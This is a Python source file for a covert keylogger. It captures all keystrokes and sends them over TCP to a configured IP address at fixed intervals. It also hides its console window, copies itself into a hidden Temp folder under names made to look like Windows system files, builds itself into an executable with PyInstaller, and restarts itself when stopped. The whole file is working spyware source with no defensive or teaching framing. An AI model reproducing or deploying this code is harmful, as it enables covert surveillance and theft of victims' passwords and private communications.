import pynput
from pynput.keyboard import Key, Listener
import socket
import threading
import time
import os
import sys
import subprocess
import tempfile
import shutil

# Configuration
IP_ADDRESS = '192.168.0.105'  # Your PC IP
PORT = 8080
SEND_INTERVAL = 10  # Send data every 10 seconds
LOG_FILE = 'Windows_System_Log.txt'  # Less suspicious filename

keys = []

def hide_console():
    """Hide the console window"""
    try:
        if os.name == 'nt':  # Windows
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE
    except:
        pass

def copy_to_temp():
    """Copy script to temp directory and run from there"""
    try:
        if getattr(sys, 'frozen', False):
            # Already compiled, just return current path
            return sys.executable
        
        # Get current script path
        current_path = os.path.abspath(sys.argv[0])
        temp_dir = tempfile.gettempdir()
        
        # Create a hidden directory in temp
        hidden_dir = os.path.join(temp_dir, "WindowsSystem")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)
            # Make it hidden on Windows
            if os.name == 'nt':
                subprocess.call(f'attrib +h "{hidden_dir}"', shell=True)
        
        # Copy script to temp location
        temp_script = os.path.join(hidden_dir, "system_service.exe" if os.name == 'nt' else "system_service")
        
        # If running as script, create a compiled version
        if current_path.endswith('.py'):
            # Use pyinstaller to create executable if available
            try:
                import PyInstaller.__main__
                PyInstaller.__main__.run([
                    current_path,
                    '--onefile',
                    '--windowed',
                    '--name', 'system_service',
                    '--distpath', hidden_dir,
                    '--workpath', os.path.join(hidden_dir, 'build'),
                    '--specpath', hidden_dir
                ])
                return os.path.join(hidden_dir, "system_service.exe")
            except:
                # Fallback: just copy the script
                shutil.copy2(current_path, temp_script)
                return temp_script
        else:
            # Already an executable, just copy it
            shutil.copy2(current_path, temp_script)
            return temp_script
            
    except Exception as e:
        return sys.argv[0]  # Return original path if anything fails

def ensure_single_instance():
    """Ensure only one instance is running"""
    try:
        if os.name == 'nt':
            import win32event
            import win32api
            import winerror
            
            mutex_name = "Global\\WindowsSystemServiceMutex"
            mutex = win32event.CreateMutex(None, False, mutex_name)
            if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
                mutex = None
                sys.exit(0)  # Another instance is already running
    except:
        pass

def send_data(data):
    """Send data to the specified IP address"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((IP_ADDRESS, PORT))
            s.sendall(data.encode('utf-8'))
    except:
        # Save failed data to retry later
        with open('failed_data.txt', 'a', encoding='utf-8') as f:
            f.write(data + '\n')

def retry_failed_data():
    """Retry sending previously failed data"""
    try:
        if os.path.exists('failed_data.txt'):
            with open('failed_data.txt', 'r', encoding='utf-8') as f:
                failed_data = f.readlines()
            
            if failed_data:
                success_data = []
                for data in failed_data:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(5)
                            s.connect((IP_ADDRESS, PORT))
                            s.sendall(data.strip().encode('utf-8'))
                        success_data.append(data)
                    except:
                        pass
                
                # Remove successfully sent data
                if success_data:
                    remaining_data = [d for d in failed_data if d not in success_data]
                    with open('failed_data.txt', 'w', encoding='utf-8') as f:
                        f.writelines(remaining_data)
    except:
        pass

def write_file(keys_data):
    """Write keys to file and send to server"""
    key_string = ""
    for key in keys_data:
        k = str(key).replace("'", "")
        if k.find("Key") != -1:
            k = f"[{k}]"
        elif k == "Key.space":
            k = " "
        elif k == "Key.enter":
            k = "\n"
        key_string += k
    
    # Write to local file
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(key_string)
    except:
        pass
    
    # Send to remote server
    send_data(key_string)

def periodic_send():
    """Periodically send collected data"""
    while True:
        time.sleep(SEND_INTERVAL)
        retry_failed_data()  # Try to send any previously failed data
        
        if keys:
            keys_copy = keys.copy()
            write_file(keys_copy)
            keys.clear()

def on_press(key):
    try:
        keys.append(key)
    except:
        pass

def on_release(key):
    try:
        if key == Key.esc:
            keys.append("[ESC]")
        return True
    except:
        return True

def self_heal():
    """Ensure the program keeps running"""
    while True:
        time.sleep(30)  # Check every 30 seconds
        try:
            # Check if listener thread is alive
            if not listener_thread.is_alive():
                restart_listener()
        except:
            restart_program()

def restart_listener():
    """Restart the keyboard listener"""
    global listener
    try:
        if listener:
            listener.stop()
    except:
        pass
    
    try:
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
    except:
        pass

def restart_program():
    """Restart the entire program"""
    try:
        python = sys.executable
        os.execl(python, python, *sys.argv)
    except:
        os._exit(1)

def main():
    # Hide console window
    hide_console()
    
    # Ensure only one instance
    ensure_single_instance()
    
    # Copy to temp and run from there if not already
    if not getattr(sys, 'frozen', False) and not sys.argv[0].endswith('.exe'):
        temp_path = copy_to_temp()
        if temp_path != sys.argv[0]:
            subprocess.Popen([sys.executable, temp_path])
            sys.exit(0)
    
    # Start periodic sending
    send_thread = threading.Thread(target=periodic_send, daemon=True)
    send_thread.start()
    
    # Start self-healing monitor
    heal_thread = threading.Thread(target=self_heal, daemon=True)
    heal_thread.start()
    
    # Start keyboard listener
    global listener
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Keep main thread alive
    while True:
        time.sleep(60)

if __name__ == "__main__":
    # Global listener reference
    listener = None
    listener_thread = None
    
    # Run with error handling
    while True:
        try:
            main()
        except Exception as e:
            time.sleep(10)
            # Attempt to restart
            try:
                restart_program()
            except:
                os._exit(1)